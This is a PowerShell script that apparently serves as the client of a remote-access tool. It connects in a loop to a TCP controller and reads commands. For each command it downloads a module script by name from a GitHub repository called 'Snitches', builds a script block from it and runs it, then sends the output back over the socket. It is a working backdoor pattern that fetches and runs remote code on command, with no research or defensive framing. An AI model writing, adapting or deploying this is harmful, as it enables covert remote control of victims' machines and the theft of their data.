# Function that inputs a command and outputs information.
function Get-CommandOutput {
    param (
        [string]$command
    )
    if ($message -eq "") {
        return "No command given!"
    }
    try {
        # Split command by ; into two parts and remove the splitter character
        $split = $command -split ";"
        $module = $split[0]
        $argument = $split[1]

        # Make a request to a URL and get the content
        $response = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/WilleLX1/Snitches/main/Modules/$module.ps1"
        $content = $response.Content
        
        # Log
        Write-Host "Module: $module"
        Write-Host "Argument: $argument"

        # Create script block with arguments
        $scriptBlock = [scriptblock]::Create($content)
        # Execute the module with the argument
        $output = & $scriptBlock $argument
        return $output
    }
    catch {
        return $_.Exception.Message
    }
}

$Connected = $false

while ($Connected -eq $false) {
    try {
        # Test the connection to 127.0.0.1 on port 1337
        $socket = New-Object Net.Sockets.TcpClient('127.0.0.1', 12345)
        $Connected = $true
        Write-Host "Connected to the server!"
        
        # String for latestMessage
        $latestMessage = ""
        while ($true) {
            # Get latest message from the server
            $stream = $socket.GetStream()
            $reader = New-Object System.IO.StreamReader($stream)
            $message = $reader.ReadLine()
            if ($message -eq $null) {
                continue
            }
            if ($message -eq "exit") {
                # Send the message
                $stream = $socket.GetStream()
                $writer = New-Object System.IO.StreamWriter($stream)
                $writer.WriteLine("Exiting...")
                $writer.Flush()
                break
            }
            if ($message -eq $latestMessage) {
                continue
            }
            $latestMessage = $message
            
            Write-Host "To execute: $message"

            # Execute the command
            $output = Get-CommandOutput($message)

            # Send the message
            $stream = $socket.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.WriteLine("Output: "+ $output)
            $writer.Flush()
        }
        $Connected = $false
    } catch {
        $Connected = $false
        Write-Host "Server is not available, waiting for 5 seconds..."
        Start-Sleep -Seconds 5
    }
}